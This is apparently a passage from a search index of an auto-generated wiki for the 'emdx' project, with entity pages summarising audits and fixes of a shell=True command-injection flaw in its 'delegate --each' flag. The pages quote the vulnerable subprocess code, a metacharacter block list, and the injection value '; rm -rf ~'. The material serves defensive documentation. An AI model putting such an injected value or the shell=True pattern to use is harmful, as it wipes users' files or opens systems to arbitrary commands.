<code>services/</code>, and <code>ui/</code>) to identify opportunities for replacing generic <code>Any</code> type annotations with more specific types. The goal is to improve type safety, code maintainabilit...</p> </li> <li> <p>#6336 Move execution utilities to services layer   Section: Move Execution Utilities to Services Layer</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Code Organization Issues</p> <ol> <li>Execution support misplaced in utils/: <code>claude_wrapper.py</code>, <code>output_parser.py</code>, <code>structured_logger.py</code> belong in <code>services/</code></li> </ol> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Current State: 16 utility files</p> <p>...tent modules | | <code>claude_wrapper.py</code> | Execution wrapper script | 241 | Belongs in services/, not utils/ | | <code>datetime_utils.py</code> | Datetime parsing | 138 | Well-scoped, good | | <code>emoji_aliases.py</code> | Tag emoji mappings | 296 | Well-scoped, good | | `environme...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...peline         \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 services/         Business logic layer                       \u2502 \u2502 \u251c\u2500\u2500 unified_executor.py   Claude/Cursor execution           \u2502 \u2502 \u251c\u2500\u2500 embedding_service.py  Semantic search...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 1. Architectural Strengths</p> <p>...What Works Well</p> </li> <li>Layered Architecture: Clean separation between <code>commands/</code>, <code>services/</code>, <code>database/</code>, <code>models/</code>, and <code>ui/</code></li> <li>Lazy Loading: Heavy commands (cascade, delegate, AI) use lazy imports for fast CLI startup</li> <li> <p>Strategy Pattern: CLI exec...</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: \u2705 Strengths</p> <p>...how consistent refactoring</p> </li> <li>Good Architecture \u2014 Clear separation: commands/, services/, ui/, database/</li> <li>Documentation \u2014 10 markdown docs covering architecture, CLI, setup</li> <li> <p>Modern Tooling \u2014 Poetry, pytest, black, ruff, mypy configured</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li><code>unified_executor.py</code>: CLI execution abstraction for Claude/Cursor</li> <li><code>cascade_service.py</code>: pipeline facade for UI, monitoring completion</li> <li> <p>**`log_stream....</p> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: Module-by-Module Analysis</p> <p>...-| | <code>commands/</code> | 8/10 | Excellent typer.Exit usage, good exception chaining | | <code>services/</code> | 7/10 | Good fallback patterns, some overly broad catches | | <code>utils/</code> | 7/10 | Consistent patterns, some silent catches need logging | | <code>models/</code> | 8/10 | Proper...</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: Layer Architecture Overview</p> <p>...(VIOLATION) | | <code>database/</code> | Database operations | Pure database operations | | <code>services/</code> | Business logic | Business logic + database access |</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Architecture</p> <p>...search/          # Search screen \u2502   \u2514\u2500\u2500 keybindings/     # Vim-style bindings \u251c\u2500\u2500 services/            # Business logic \u2502   \u251c\u2500\u2500 cascade_service.py   # Cascade operations \u2502   \u251c\u2500\u2500 unified_executor.py  # Claude CLI execution \u2502   \u251c\u2500\u2500 log_stream.py        # Even...</p> </li> </ul>"},{"location":"entities/services/#servicestypespy-11-typeddicts","title":"<code>services/types.py</code> \u2014 11 TypedDicts","text":"TypedDict total=False? <code>HealthStats</code> no <code>OverallHealthResult</code> no <code>ProcessHealthStatus</code> no `Exe..."},{"location":"entities/services/#summary","title":"Summary","text":"<p>Moved execution-specific code from <code>utils/</code> to <code>services/</code> where it logically belongs:</p>"},{"location":"entities/services/#4-services-layer-services","title":"4. Services Layer (<code>services/</code>)","text":""},{"location":"entities/services/#related-entities","title":"Related Entities","text":"<ul> <li><code>commands/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.6)</li> <li><code>total python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>overview three</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>database/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.4)</li> <li><code>config/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>estimated total effort</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>config/ui_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>config/tagging_rules.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>utils/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/shellfalse/","title":"shell=false","text":"<p>Type: tech_term | Mentioned in: 25 documents | First seen: 2026-02-14</p>"},{"location":"entities/shellfalse/#documents-25","title":"Documents (25)","text":"<ul> <li>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three Navigation Modes <p>...already works \u2014 <code>command injection</code> clusters with <code>shlex.split()</code>, <code>shell=true</code>, <code>shell=false</code>, <code>security fix</code></p> </li> <li>Use simple connected-components on the co-occurrence graph (entities that appear together in &gt;= 3 docs)</li> <li> <p>Name clusters by the highest-scoring ent...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: 4. Dynamic Discovery Mode (<code>--each</code> + <code>--do</code>)</p> <p>...<code>git</code>, <code>locate</code>, <code>tree</code>, <code>echo</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, <code>seq</code></p> </li> <li>Runs command with <code>shell=False</code> (injection-safe)</li> <li>Templates each output line into task prompts</li> <li> <p>Discovered tasks prepend to any explicit tasks</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: 3. Safe Execution</p> <p>Commands are parsed using <code>shlex.split()</code> and executed with <code>shell=False</code>:</p> </li> <li> <p>#6378 Codebase Bug Audit 2026-02-15 [9/10]   Section: Security Strengths Observed</p> <p>...protection** - <code>delegate --each</code> uses allowlisted commands with <code>shlex.split()</code> + <code>shell=False</code></p> </li> <li>Parameterized SQL queries - All user-facing queries use <code>?</code> placeholders</li> <li>FTS5 query escaping - User search input is properly escaped</li> <li> <p>**Secure temp...</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 1. CRITICAL Security Vulnerability Fixed (PR #484, #494)</p> <p>...allowed arbitrary command execution</p> </li> <li>Fix: Command allowlist + <code>shlex.split()</code> + <code>shell=False</code></li> <li>28+ security tests added</li> <li> <p>Breaking change: Pipes/shell operators no longer supported (by design)</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: emdx/commands/delegate.py</p> <ol> <li>Modified <code>_run_discovery()</code> to use secure execution:</li> </ol> </li> <li>Calls <code>_validate_discovery_command()</code> before execution</li> <li>Uses <code>shell=False</code> with parsed argument list</li> <li> <p>Prevents shell injection via semicolons, pipes, backticks, <code>$()</code>, etc.</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Fix Implementation</p> </li> </ul> <pre><code>result = subprocess.run(args, shell=False, capture_output=True, ...)\n</code></pre> <ul> <li>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL) <p>...allowlist</p> </li> <li>Checks for dangerous shell metacharacters (<code>;|&amp;$\\</code>\\`)</li> <li>Changed to <code>shell=False</code> with argument list</li> <li> <p>Added <code>FileNotFoundError</code> handling</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Fix</p> <ol> <li>Safe Execution: Commands run with <code>shell=False</code> using <code>shlex.split()</code>:</li> </ol> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: 1. Command Injection Fix (emdx/commands/delegate.py)</p> <p>...e base command is in the allowlist</p> </li> <li> <p>Changed subprocess call from <code>shell=True</code> to <code>shell=False</code></p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Fix Applied</p> <ol> <li>Changed <code>_run_discovery()</code> to use <code>shell=False</code> - Executes with parsed argument list instead of shell string</li> </ol> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <ol> <li>Safe subprocess execution: Uses <code>shlex.split()</code> + <code>shell=False</code>:</li> </ol> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Solution</p> <ol> <li>Changed to <code>shell=False</code> with <code>shlex.split()</code>:</li> </ol> </li> <li>Proper argument parsing prevents injection</li> <li> <p>Commands are validated before execution</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Code Changes (<code>emdx/commands/delegate.py</code>)</p> <ol> <li>Updated <code>_run_discovery()</code>:</li> </ol> </li> <li>Now calls validation before execution</li> <li> <p>Uses <code>shell=False</code> to prevent shell injection</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Fix Applied</p> <p>Replaced <code>shell=True</code> with <code>shlex.split()</code> + <code>shell=False</code> to prevent command injection:</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> <ol> <li>Secure execution: Uses <code>shlex.split()</code> with <code>shell=False</code>: ```python</li> </ol> </li> </ul>"},{"location":"entities/shellfalse/#3-safe-execution","title":"3. Safe Execution","text":"<p>Changed subprocess call to use <code>shell=False</code>:</p>"},{"location":"entities/shellfalse/#after-secure","title":"AFTER (secure)","text":"<p>args = _validate_discovery_command(command) result = subprocess.run(     args,     shell=False,  # SECURITY: Never use shell=True with u...</p> <ul> <li>#6250 Delegate: Security Fix - Command Injection in --each   Section: Fix Applied <ol> <li>Use <code>shlex.split()</code> to safely parse commands into argument lists</li> </ol> </li> <li>Use <code>shell=False</code> to prevent shell interpretation of metacharacters</li> <li>Added error handling for malformed commands and missing executables</li> <li> <p>Added 11 comprehensive tests c...</p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Fix Implementation</p> </li> <li>Uses <code>shlex.split()</code> for proper argument parsing</li> <li>Uses <code>shell=False</code> to prevent shell interpretation</li> <li> <p>Glob patterns (<code>*</code>, <code>?</code>) are allowed since they're safe with <code>shell=False</code></p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: The Fix</p> <ol> <li>Changed to <code>shell=False</code> - Executes the command as an argument list:</li> </ol> </li> <li>Prevents shell metacharacter injection (<code>;</code>, <code>|</code>, <code>$()</code>, etc.)</li> <li> <p>Pipe characters become harmless literal arguments</p> </li> <li> <p>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37]   Section: Fix Applied</p> <p>...(fd, find, git, rg, ls, grep, etc.)</p> </li> <li>Safe Execution - Use <code>shlex.split()</code> + <code>shell=False</code> to prevent shell injection</li> <li> <p>Metacharacter Rejection - Block shell operators: <code>$()</code>, backticks, pipes, redirects, chaining</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Fix Applied</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: The Fix</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...mmand execution</p> </li> <li> <p>Fix: Validate/restrict commands or use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> <p>Recommendation: Either:</p> </li> <li>Restrict to known-safe commands (fd, find, git ls-files)</li> <li>Parse and validate the command structure before execution</li> <li> <p>Use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6221 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 1. COMMAND INJECTION - HIGH SEVERITY</p> <p>Recommendation: Validate and sanitize the <code>--each</code> input, or use <code>shlex.split()</code> with <code>shell=False</code>. Consider restricting to a whitelist of safe discovery commands (fd, find, ls, git ls-files).</p> </li> </ul>"},{"location":"entities/shellfalse/#3-safe-execution_1","title":"3. Safe Execution","text":""},{"location":"entities/shellfalse/#2-no-shell-execution","title":"2. No Shell Execution","text":"<p>Uses <code>shlex.split()</code> + <code>shell=False</code> instead of <code>shell=True</code></p>"},{"location":"entities/shellfalse/#2-shell-disabled","title":"2. Shell Disabled","text":"<p>Commands are parsed with <code>shlex.split()</code> and executed with <code>shell=False</code>:</p>"},{"location":"entities/shellfalse/#related-entities","title":"Related Entities","text":"<ul> <li><code>security fix: command injection in delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.1)</li> <li><code>locate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.1)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>overall security posture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>overall security posture:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>added</code>_validate_discovery_command()<code>function</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>subprocess.run(command, shell=true)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>risk assessment update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/shelltrue/","title":"shell=true","text":"<p>Type: tech_term | Mentioned in: 28 documents | First seen: 2026-02-13</p>"},{"location":"entities/shelltrue/#documents-28","title":"Documents (28)","text":"<ul> <li>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three Navigation Modes <p>...currence query already works \u2014 <code>command injection</code> clusters with <code>shlex.split()</code>, <code>shell=true</code>, <code>shell=false</code>, <code>security fix</code></p> </li> <li>Use simple connected-components on the co-occurrence graph (entities that appear together in &gt;= 3 docs)</li> <li> <p>Name clusters by the high...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Vulnerability Details</p> <p>Issue: The <code>--each</code> flag passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>, enabling arbitrary command execution:</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: The Problem</p> <p>The <code>--each</code> flag accepted user-provided commands and executed them using <code>subprocess.run()</code> with <code>shell=True</code>:</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: Security Assessment</p> <p>Strengths:</p> </li> <li>No <code>shell=True</code> subprocess calls</li> <li>Parameterized SQL for user-facing queries</li> <li>FTS5 query escaping implemented correctly</li> <li>No eval()/exec() usage</li> <li> <p>API keys from environment variables</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: Security Review</p> </li> <li>No bare <code>except:</code> clauses (always <code>except Exception:</code>)</li> <li>No hardcoded credentials found</li> <li> <p>Minimal shell=True usage (1 occurrence, properly scoped)</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 1. CRITICAL Security Vulnerability Fixed (PR #484, #494)</p> <p>...ction in <code>delegate --each</code>** - The most severe finding:</p> </li> <li><code>subprocess.run(command, shell=True)</code> allowed arbitrary command execution</li> <li>Fix: Command allowlist + <code>shlex.split()</code> + <code>shell=False</code></li> <li>28+ security tests added</li> <li> <p>Breaking change: Pipes/shell operat...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: Summary</p> <p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling arbitrary command execution.</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Vulnerability Details</p> <p>The original <code>_run_discovery()</code> function passed user input directly to subprocess with <code>shell=True</code>:</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Vulnerability</p> <p>The <code>--each</code> flag passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: Summary</p> <p>Fixed the critical command injection vulnerability identified in the security audit. The <code>--each</code> flag in <code>emdx delegate</code> previously passed user input directly to a shell subprocess (<code>shell=True</code>), enabling arbitrary command execution.</p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code> was using <code>shell=True</code> with user input from the <code>--each</code> flag:</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Issue</p> <p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> used <code>shell=True</code> with user-provided input:</p> </li> <li> <p>#6254 Delegate: Fix command injection in --each discovery   Section: The Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py:141</code> was using <code>shell=True</code> with user-provided input:</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Vulnerability</p> <p>The <code>_run_discovery()</code> function used <code>shell=True</code> with user-provided input from the <code>--each</code> flag, allowing arbitrary command execution:</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Vulnerability Details</p> <p>Issue: The <code>--each</code> flag passed user input directly to a shell via <code>shell=True</code>:</p> </li> </ul> <pre><code>result = subprocess.run(command, shell=True, ...)  # DANGEROUS\n</code></pre> <ul> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: Summary</p> <p>Fixed a CRITICAL command injection vulnerability in <code>emdx/commands/delegate.py</code> where the <code>--each</code> flag passed user input directly to a shell via <code>subprocess.run(command, shell=True)</code>.</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery()</code> function) Severity: HIGH Issue: The <code>--each</code> flag passed user input directly to a shell via <code>shell=True</code>, allowing command injection attacks.</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Security Fix: Command Injection in Delegate Discovery</p> <p>Issue: CRITICAL - The <code>--each</code> flag in <code>emdx delegate</code> was vulnerable to command injection due to using <code>shell=True</code> with user-provided input.</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...ability** (Security)</p> </li> <li>Location: <code>emdx/commands/delegate.py:144</code></li> <li>Issue: <code>shell=True</code> with user input in <code>--each</code> flag enables arbitrary command execution</li> <li> <p>Fix: Validate/restrict commands or use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> <p>```python def _run_discovery(command: str) -&gt; List[str]:     result = subprocess.run(         command,         shell=True,  # DANGEROUS: shell=True with user input         capture_output=True,         text=True,         timeout=30,     )</p> </li> </ul> <pre><code>\n- **#6221** Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]\n  *Section: 1. COMMAND INJECTION - HIGH SEVERITY*\n  &gt; ...(command: str) -&gt; List[str]:\n    result = subprocess.run(\n        command,\n        shell=True,  # &lt;-- shell=True with user-controlled input\n        capture_output=True,\n        text=True,\n        timeout=30,\n    )\n</code></pre> <ul> <li>#6183 Delegate: analysis,audit [13/17]   Section: \ud83d\udd34 Critical <ol> <li>Shell Injection Risk</li> </ol> </li> <li><code>delegate.py:134</code> uses <code>shell=True</code> with subprocess</li> <li>Potential command injection if user input reaches this path</li> <li>Review the input sanitization</li> </ul>"},{"location":"entities/shelltrue/#good-practices","title":"\u2705 Good Practices","text":""},{"location":"entities/shelltrue/#the-vulnerability-cve-worthy","title":"The Vulnerability (CVE-worthy)","text":"<p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/shelltrue/#the-vulnerability","title":"The Vulnerability","text":"<p>The <code>--each</code> flag in <code>emdx delegate</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/shelltrue/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_commands_delegate.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (15 shared docs, PMI=4.9)</li> <li><code>security fix: command injection in delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=4.9)</li> <li><code>--each \"; rm -rf ~\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.9)</li> <li><code>critical command injection vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.9)</li> <li><code>vulnerability details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.9)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>/usr/bin/fd</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>the vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>before (vulnerable):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/shlexsplit/","title":"shlex.split()","text":"<p>Type: tech_term | Mentioned in: 28 documents | First seen: 2026-02-14</p>"},{"location":"entities/shlexsplit/#documents-28","title":"Documents (28)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...PATH | 115 | <code>emdx/commands/delegate.py</code> | | FUNC_CALL | 53 | <code>_run_discovery()</code>, <code>shlex.split()</code> | | CLI_FLAG | 27 | <code>--each</code>, <code>--json</code> | | SUMMARY_NOISE | 12 | <code>summary fixed</code>, <code>summary added</code> | | TYPE_ANNOT | 8 | <code>dict[str, any]</code>, <code>list[dict[str, any]]</code> |</p> </li> <li> <p>#6529 Delegate: Review GitHub PR #652 using 'gh pr view 652' and 'gh pr diff [1/4]   Section: Issues &amp; Suggestions \ud83d\udd0d</p> <p>Suggestion: Use <code>shlex.split()</code> for shell-like parsing.</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: 2. Input Validation</p> <p>Added <code>_validate_discovery_command()</code> function that:</p> </li> <li>Uses <code>shlex.split()</code> for safe command parsing</li> <li>Extracts base command name (handles absolute paths like <code>/usr/bin/fd</code>)</li> <li>Validates command against the allowlist</li> <li> <p>Rejects dangerous shel...</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: 3. Safe Execution</p> <p>Commands are parsed using <code>shlex.split()</code> and executed with <code>shell=False</code>:</p> </li> <li> <p>#6378 Codebase Bug Audit 2026-02-15 [9/10]   Section: Security Strengths Observed</p> <p>...Command injection protection** - <code>delegate --each</code> uses allowlisted commands with <code>shlex.split()</code> + <code>shell=False</code></p> </li> <li>Parameterized SQL queries - All user-facing queries use <code>?</code> placeholders</li> <li> <p>FTS5 query escaping - User search input is properly escaped 5...</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 1. CRITICAL Security Vulnerability Fixed (PR #484, #494)</p> <p>...mand, shell=True)` allowed arbitrary command execution</p> </li> <li>Fix: Command allowlist + <code>shlex.split()</code> + <code>shell=False</code></li> <li>28+ security tests added</li> <li> <p>Breaking change: Pipes/shell operators no longer supported (by design)</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: emdx/commands/delegate.py</p> <p>...Added <code>_validate_discovery_command()</code> function** that:</p> </li> <li>Parses commands using <code>shlex.split()</code> (prevents shell metacharacter injection)</li> <li>Extracts the base command name (handles full paths like <code>/usr/bin/fd</code>)</li> <li>Validates against the allowlist</li> <li> <p>Rejec...</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Fix Implementation</p> <p>...tion Function New <code>_validate_discovery_command()</code> function:</p> </li> <li>Parses command with <code>shlex.split()</code> for safe tokenization</li> <li>Extracts base command name (handles absolute paths like <code>/usr/bin/fd</code>)</li> <li>Validates against allowlist</li> <li> <p>Blocks shell metacharacters: <code>;</code>, `&amp;&amp;...</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)</p> <p>...a`</p> </li> <li>Added <code>_validate_discovery_command()</code> function that:</li> <li>Parses command with <code>shlex.split()</code> </li> <li>Validates base command is in allowlist</li> <li>Checks for dangerous shell metacharacters (<code>;|&amp;$\\</code>\\`)</li> <li>Changed to <code>shell=False</code> with argument list</li> <li> <p>Added `FileNo...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Fix</p> <ol> <li>Safe Execution: Commands run with <code>shell=False</code> using <code>shlex.split()</code>:</li> </ol> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Fix Implementation</p> </li> <li>Rejects shell metacharacters: <code>;</code>, <code>&amp;</code>, <code>|</code>, backticks, <code>$()</code>, <code>${}</code></li> <li>Validates base command against allowlist</li> <li> <p>Uses <code>shlex.split()</code> for safe argument parsing</p> </li> <li> 